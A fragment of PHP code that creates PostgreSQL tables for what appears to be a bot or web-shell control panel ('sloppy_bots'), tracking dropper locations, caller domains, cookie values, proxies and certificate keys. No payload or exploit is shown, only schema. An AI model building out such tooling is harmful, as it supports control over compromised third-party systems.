    ...
    function createDB()
    {
        ...
        if (empty($sloppy_ini['sloppy_db']['pass'])) {
            try {
                ...
                pg_exec($this->init_conn(), "CREATE TABLE IF NOT EXISTS sloppy_bots_slim_droppers(id SERIAL NOT NULL constraint sloppy_bots_slim_droppers_pkey primary key,datetime TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL, location_on_disk TEXT NOT NULL UNIQUE, caller_domain TEXT NOT NULL DEFAULT '-', cookiename TEXT NOT NULL DEFAULT '-', cookievalue TEXT NOT NULL DEFAULT '-', user_agent TEXT NOT NULL DEFAULT '-')");
                ...
                pg_exec($this->init_conn(), "CREATE TABLE IF NOT EXISTS sloppy_bots_certs(id SERIAL NOT NULL constraint sloppy_bots_certs_pkey primary key,datetime TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL, cert_location_on_disk TEXT UNIQUE NOT NULL DEFAULT '-', base64_encoded_cert TEXT UNIQUE NOT NULL DEFAULT '-', csr TEXT UNIQUE DEFAULT '-', pub TEXT UNIQUE DEFAULT '-', pem TEXT UNIQUE DEFAULT '-', cipher TEXT DEFAULT '-', encrypted BOOLEAN DEFAULT false, priv_key_password TEXT NOT NULL DEFAULT '-' UNIQUE)");
                ...
                pg_exec($this->init_conn(), "GRANT SELECT,INSERT,UPDATE ON sloppy_bots_main,sloppy_bots_certs,sloppy_bots_domains,sloppy_bots_tools,sloppy_bots_proxies,sloppy_bots_slim_droppers TO sloppy_bot");
